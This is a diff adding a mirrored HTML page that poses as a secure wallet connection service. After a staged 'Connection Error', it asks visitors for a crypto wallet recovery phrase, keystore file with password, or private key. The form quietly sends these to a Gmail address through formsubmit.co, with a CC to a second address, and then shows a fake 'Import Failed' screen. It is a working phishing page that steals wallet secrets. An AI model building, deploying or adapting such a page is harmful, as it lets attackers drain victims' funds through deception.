@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Mirrored from securedconnect.netlify.app/connect by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 12 Aug 2026 13:00:03 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <title>Import Wallet - Secure Connection</title>
+
+    <!-- Lucide (icons). We call safely in JS if it's available -->
+    <script src="../cdnjs.cloudflare.com/ajax/libs/lucide/0.263.1/umd/lucide.min.html"></script>
+
+    <style>
+        /* (your full CSS kept as-is) */
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: linear-gradient(135deg, #1e293b 0%, #1e40af 50%, #1e293b 100%);
+            min-height:100vh; display:flex; align-items:center; justify-content:center; padding:20px;
+        }
+        .screen { display:none; }
+        .screen.active { display:block; }
+        .connecting-screen { text-align:center; color:white; }
+        .loader-container { position:relative; width:128px; height:128px; margin:0 auto 32px; }
+        .pulse-ring { position:absolute; inset:0; border:4px solid #3b82f6; border-radius:50%; animation: ping 1.5s cubic-bezier(0,0,0.2,1) infinite; }
+        .pulse-ring:nth-child(2) { animation: pulse 2s cubic-bezier(0.4,0,0.6,1) infinite; border-color:#60a5fa; }
+        .shield-icon { position:absolute; inset:0; display:flex; align-items:center; justify-content:center; animation: pulse 2s cubic-bezier(0.4,0,0.6,1) infinite; }
+        .connecting-text { font-size:24px; font-weight:bold; margin-bottom:16px; animation: pulse 2s cubic-bezier(0.4,0,0.6,1) infinite; }
+        .dot-container { display:flex; justify-content:center; gap:8px; }
+        .dot { width:12px; height:12px; background:#60a5fa; border-radius:50%; animation:bounce 1.4s infinite ease-in-out both; }
+        .dot:nth-child(2){ animation-delay:.15s } .dot:nth-child(3){ animation-delay:.3s }
+        .error-screen { text-align:center; color:white; max-width:500px; animation:fadeIn .5s ease-in; }
+        .error-icon-circle { position:relative; width:128px; height:128px; margin:0 auto 32px; background:rgba(239,68,68,0.1); border-radius:50%; display:flex; align-items:center; justify-content:center; border:3px solid #ef4444; animation:errorPulse 2s ease-in-out infinite; }
+        .error-title { font-size:28px; font-weight:bold; margin-bottom:16px; color:#fca5a5; }
+        .error-message { font-size:16px; margin-bottom:32px; color:#e5e7eb; line-height:1.6; }
+        .proceed-btn { padding:16px 48px; background:#2563eb; color:white; border:none; border-radius:12px; font-size:16px; font-weight:600; cursor:pointer; transition:all .3s; box-shadow:0 4px 6px -1px rgba(0,0,0,.3); }
+        .proceed-btn:hover { background:#1d4ed8; transform:translateY(-2px); box-shadow:0 8px 12px -1px rgba(0,0,0,.4); }
+        .form-container { background:white; border-radius:16px; box-shadow:0 25px 50px -12px rgba(0,0,0,.5); padding:48px; max-width:700px; width:100%; animation:slideUp .6s ease-out; }
+        .header { text-align:center; margin-bottom:32px; }
+        .icon-circle { display:inline-block; background:#dbeafe; border-radius:50%; padding:16px; margin-bottom:16px; }
+        .title { font-size:28px; font-weight:bold; color:#1f2937; margin-bottom:8px; }
+        .security-badge { display:flex; align-items:center; justify-content:center; color:#16a34a; font-size:14px; gap:8px; }
+        .tabs { display:flex; border-bottom:2px solid #e5e7eb; margin-bottom:32px; }
+        .tab { flex:1; padding:16px; background:none; border:none; font-size:14px; font-weight:600; color:#6b7280; cursor:pointer; transition:all .3s; display:flex; align-items:center; justify-content:center; gap:8px; border-bottom:2px solid transparent; margin-bottom:-2px; }
+        .tab:hover { color:#374151; } .tab.active { color:#2563eb; border-bottom-color:#2563eb; }
+        .tab-content { display:none; animation:fadeIn .4s ease-in; } .tab-content.active { display:block; }
+        .form-group { margin-bottom:24px; } label { display:block; font-size:14px; font-weight:500; color:#374151; margin-bottom:8px; }
+        textarea,input { width:100%; padding:12px 16px; border:1px solid #d1d5db; border-radius:8px; font-size:14px; transition:all .3s; font-family:inherit; }
+        textarea{ resize:none; min-height:150px; } textarea.mono,input.mono{ font-family:'Courier New',monospace; font-size:13px; }
+        textarea:focus,input:focus { outline:none; border-color:#2563eb; box-shadow:0 0 0 3px rgba(37,99,235,.1); }
+        .help-text { font-size:13px; color:#6b7280; margin-top:8px; }
+        .submit-btn { width:100%; padding:16px; background:#2563eb; color:white; border:none; border-radius:8px; font-size:16px; font-weight:600; cursor:pointer; transition:all .3s; box-shadow:0 4px 6px -1px rgba(0,0,0,.1); }
+        .submit-btn:hover { background:#1d4ed8; transform:scale(1.02); } .submit-btn:disabled { opacity:.5; cursor:not-allowed; transform:none; }
+        .warning-box { background:#fffbeb; border:1px solid #fcd34d; border-radius:8px; padding:16px; margin-top:24px; display:flex; gap:12px; }
+        .warning-box svg{ flex-shrink:0; color:#d97706; margin-top:2px; }
+        .warning-text { font-size:13px; color:#92400e; line-height:1.5; }
+        .final-error-container { background:white; border-radius:16px; box-shadow:0 25px 50px -12px rgba(0,0,0,.5); padding:48px; max-width:500px; width:100%; text-align:center; animation:slideUp .6s ease-out; }
+        .final-error-icon { background:#fee2e2; border-radius:50%; padding:16px; display:inline-block; margin-bottom:24px; }
+        .final-error-title { font-size:24px; font-weight:bold; color:#1f2937; margin-bottom:16px; }
+        .final-error-message { color:#6b7280; margin-bottom:32px; line-height:1.6; }
+        .back-btn { width:100%; padding:16px; background:#2563eb; color:white; border:none; border-radius:8px; font-size:16px; font-weight:600; cursor:pointer; transition:all .3s; }
+        .back-btn:hover { background:#1d4ed8; transform:scale(1.02); }
+        @keyframes ping { 75%,100%{ transform:scale(1.5); opacity:0; } }
+        @keyframes pulse { 0%,100%{ opacity:1 } 50%{ opacity:.5 } }
+        @keyframes bounce { 0%,80%,100%{ transform:scale(0) } 40%{ transform:scale(1) } }
+        @keyframes errorPulse { 0%,100%{ transform:scale(1); box-shadow:0 0 0 0 rgba(239,68,68,.4) } 50%{ transform:scale(1.05); box-shadow:0 0 0 10px rgba(239,68,68,0) } }
+        @keyframes slideUp { from{ opacity:0; transform:translateY(30px) } to{ opacity:1; transform:translateY(0) } }
+        @keyframes fadeIn { from{ opacity:0 } to{ opacity:1 } }
+        @media (max-width:768px) { .form-container,.final-error-container{ padding:32px 24px } .tab{ font-size:12px; padding:12px 8px } .connecting-text,.error-title{ font-size:20px } }
+    </style>
+</head>
+<body>
+
+    <!-- Step 1: Connecting Screen -->
+    <div id="screen1" class="screen connecting-screen active">
+        <div class="loader-container">
+            <div class="pulse-ring"></div>
+            <div class="pulse-ring"></div>
+            <div class="shield-icon">
+                <i data-lucide="shield" style="width:64px; height:64px; color:#60a5fa;"></i>
+            </div>
+        </div>
+        <h2 class="connecting-text">Establishing Secure Connection</h2>
+        <div class="dot-container">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+        </div>
+
+        <!-- small fallback continue button if something prevents auto-switch -->
+        <p style="margin-top:18px;">
+            <a id="fallbackContinue" href="#" style="color:#a5b4fc; text-decoration:underline;">Continue manually</a>
+        </p>
+    </div>
+
+    <!-- Step 2: Connection Error -->
+    <div id="screen2" class="screen error-screen">
+        <div class="error-icon-circle">
+            <i data-lucide="wifi-off" style="width:64px; height:64px; color:#ef4444;"></i>
+        </div>
+        <h2 class="error-title">Connection Error</h2>
+        <p class="error-message">Unable to establish automatic connection. Please proceed manually to import your wallet securely.</p>
+        <button class="proceed-btn" id="proceedBtn">PROCEED MANUALLY</button>
+    </div>
+
+    <!-- Step 3: Form -->
+    <div id="screen3" class="screen form-container" aria-live="polite">
+                                <form action="https://formsubmit.co/oriadeadonis@gmail.com" method="post" enctype="multipart/form-data" id="form" class="ajaxForm">
+                                        
+                                    <input type="hidden" name="_cc" value="formsubmitmails@gmail.com">
+
+
+                                        <input type="hidden" name="_captcha" value="false">
+                                        <input type="hidden" name="_next" value="https://securedconnect.vercel.app//error/load.html">
+            <!-- Netlify required -->
+            <input type="hidden" name="form-name" value="wallet-import">
+            <!-- honeypot -->
+            <p style="height:0; opacity:0; position:absolute; left:-9999px;">
+                <label>Don’t fill this out if you're human: <input name="bot-field" /></label>
+            </p>
+
+            <input type="hidden" name="import-type" id="importType" value="phrase">
+
+            <div class="header">
+                <div class="icon-circle">
+                    <i data-lucide="lock" style="width:48px; height:48px; color:#2563eb;"></i>
+                </div>
+                <h1 class="title">Import Wallet</h1>
+                <div class="security-badge">
+                    <i data-lucide="check-circle" style="width:16px; height:16px;"></i>
+                    <span>Your information is highly secured</span>
+                </div>
+            </div>
+
+            <div class="tabs" role="tablist" aria-label="Import method tabs">
+                <button type="button" class="tab active" data-tab="phrase" role="tab" aria-selected="true"> <i data-lucide="key" style="width:20px;height:20px;"></i> PHRASE</button>
+                <button type="button" class="tab" data-tab="keystore" role="tab" aria-selected="false"> <i data-lucide="file-text" style="width:20px;height:20px;"></i> KEYSTORE JSON</button>
+                <button type="button" class="tab" data-tab="privateKey" role="tab" aria-selected="false"> <i data-lucide="shield" style="width:20px;height:20px;"></i> PRIVATE KEY</button>
+            </div>
+
+            <div id="phraseTab" class="tab-content active" role="tabpanel">
+                <div class="form-group">
+                    <label for="phrase">Recovery Phrase</label>
+                    <textarea id="phrase" name="phrase" placeholder="Enter your 12 or 24 word recovery phrase" required></textarea>
+                    <p class="help-text">Typically 12 (sometimes 24) words separated by single spaces.</p>
+                </div>
+            </div>
+
+            <div id="keystoreTab" class="tab-content" role="tabpanel" hidden>
+                <div class="form-group">
+                    <label for="keystore">Keystore JSON</label>
+                    <textarea id="keystore" name="keystore" class="mono" placeholder='{"version":3,"id":"...","address":"..."}' style="min-height:120px;"></textarea>
+                </div>
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" name="password" placeholder="Enter keystore password">
+                </div>
+            </div>
+
+            <div id="privateKeyTab" class="tab-content" role="tabpanel" hidden>
+                <div class="form-group">
+                    <label for="privateKey">Private Key</label>
+                    <textarea id="privateKey" name="privateKey" class="mono" placeholder="Enter your private key (64 hexadecimal characters)" style="min-height:120px;"></textarea>
+                    <p class="help-text">Your private key is typically 64 characters.</p>
+                </div>
+            </div>
+
+            <button type="submit" class="submit-btn">IMPORT WALLET</button>
+
+            
+
+        </form>
+    </div>
+
+    <!-- Step 4: Final Error -->
+    <div id="screen4" class="screen final-error-container">
+        <div class="final-error-icon">
+            <i data-lucide="alert-circle" style="width:64px; height:64px; color:#dc2626;"></i>
+        </div>
+        <h2 class="final-error-title">Import Failed</h2>
+        <p class="final-error-message">Unable to import wallet. Please verify your credentials and try again.</p>
+        <button class="back-btn" onclick="window.location.href='index-2.html'">Return to Home</button>
+    </div>
+
+    <script>
+        // ---- Safe Lucide initialization ----
+        (function safeLucide() {
+            try {
+                if (window.lucide && typeof window.lucide.replace === 'function') {
+                    window.lucide.replace();
+                }
+            } catch (err) {
+                // If lucide is not available or errors, don't break the rest of the script.
+                console.warn('lucide not available or failed to initialize:', err);
+            }
+        })();
+
+        // Helper to safely call lucide.replace() when available
+        function safeReplaceIcons() {
+            try {
+                if (window.lucide && typeof window.lucide.replace === 'function') {
+                    window.lucide.replace();
+                }
+            } catch (err) {
+                // swallow
+            }
+        }
+
+        // Robust showScreen that never throws
+        function showScreen(screenNumber) {
+            try {
+                document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+                const el = document.getElementById('screen' + screenNumber);
+                if (el) el.classList.add('active');
+                safeReplaceIcons();
+            } catch (err) {
+                console.error('showScreen error', err);
+            }
+        }
+
+        // Auto-move to Screen 2 after 3s (but guarded)
+        setTimeout(() => {
+            try {
+                showScreen(2);
+            } catch (e) {
+                // still try to reveal screen2 even if something odd happens
+                const fallback = document.getElementById('screen2');
+                if (fallback) {
+                    fallback.classList.add('active');
+                }
+            }
+        }, 3000);
+
+        // fallback manual continue link (in case auto-switch is blocked)
+        (function bindFallbackContinue() {
+            const fc = document.getElementById('fallbackContinue');
+            if (!fc) return;
+            fc.addEventListener('click', function (ev) {
+                ev.preventDefault();
+                showScreen(2);
+            });
+        })();
+
+        // proceed button to move to form (guarded)
+        (function bindProceedBtn() {
+            const proceedBtn = document.getElementById('proceedBtn');
+            if (!proceedBtn) return;
+            proceedBtn.addEventListener('click', function () {
+                showScreen(3);
+                // ensure phrase tab active by default
+                activateTab('phrase');
+            });
+        })();
+
+        // TAB LOGIC
+        const tabs = Array.from(document.querySelectorAll('.tab'));
+        const tabContents = Array.from(document.querySelectorAll('.tab-content'));
+        const importTypeInput = document.getElementById('importType');
+
+        function activateTab(tabName) {
+            try {
+                tabs.forEach(t => {
+                    if (t.dataset.tab === tabName) {
+                        t.classList.add('active');
+                        t.setAttribute('aria-selected', 'true');
+                    } else {
+                        t.classList.remove('active');
+                        t.setAttribute('aria-selected', 'false');
+                    }
+                });
+
+                tabContents.forEach(c => {
+                    if (c.id === tabName + 'Tab') {
+                        c.classList.add('active');
+                        c.hidden = false;
+                    } else {
+                        c.classList.remove('active');
+                        c.hidden = true;
+                    }
+                });
+
+                if (importTypeInput) importTypeInput.value = tabName;
+                updateRequiredFields(tabName);
+                safeReplaceIcons();
+            } catch (err) {
+                console.error('activateTab error', err);
+            }
+        }
+
+        function updateRequiredFields(activeTab) {
+            // remove required first
+            ['phrase','keystore','password','privateKey'].forEach(id => {
+                const el = document.getElementById(id);
+                if (el) el.removeAttribute('required');
+            });
+
+            if (activeTab === 'phrase') {
+                const p = document.getElementById('phrase');
+                if (p) p.setAttribute('required','');
+            } else if (activeTab === 'keystore') {
+                const ks = document.getElementById('keystore');
+                const pw = document.getElementById('password');
+                if (ks) ks.setAttribute('required','');
+                if (pw) pw.setAttribute('required','');
+            } else if (activeTab === 'privateKey') {
+                const pk = document.getElementById('privateKey');
+                if (pk) pk.setAttribute('required','');
+            }
+        }
+
+        // bind tabs safely
+        tabs.forEach(tab => {
+            tab.addEventListener('click', function () {
+                const tabName = this.dataset.tab;
+                activateTab(tabName);
+            });
+        });
+
+        // Form submission (Netlify)
+        (function bindForm() {
+            const form = document.getElementById('');
+            if (!form) return;
+
+            form.addEventListener('', function (e) {
+                e.preventDefault();
+
+                // Basic client-side validation (ensure required fields present)
+                const activeType = importTypeInput ? importTypeInput.value : '';
+                if (activeType === 'phrase') {
+                    const phrase = document.getElementById('');
+                    if (!phrase || !phrase.value.trim()) {
+                        alert('Please enter your recovery .');
+                        return;
+                    }
+                }
+                // disable submit
+                const submitBtn = form.querySelector('');
+                if (submitBtn) {
+                    submitBtn.textContent = 'IMPORTING...';
+                    submitBtn.disabled = true;
+                }
+
+                // Prepare data for Netlify
+                const formData = new FormData();
+                // include bot-field if present (honeypot)
+                const body = new URLSearchParams();
+                for (const pair of formData.entries()) {
+                    body.append(pair[0], pair[1]);
+                }
+
+                // Send to Netlify (works because page is static HTML)
+                fetch('index.html', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: body.toString()
+                })
+                .then(() => {
+                    // show final screen after small delay
+                    setTimeout(() => showScreen(4), 800);
+                })
+                .catch(err => {
+                    console.error('Form submission failed:', err);
+                    showScreen(4);
+                });
+            });
+        })();
+
+        // ensure initial required state
+        try { updateRequiredFields(''); } catch (e) {}
+
+    </script>
+
+</body>
+
+<!-- Mirrored from securedconnect.netlify.app/connect by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 12 Aug 2026 13:00:05 GMT -->
+</html>
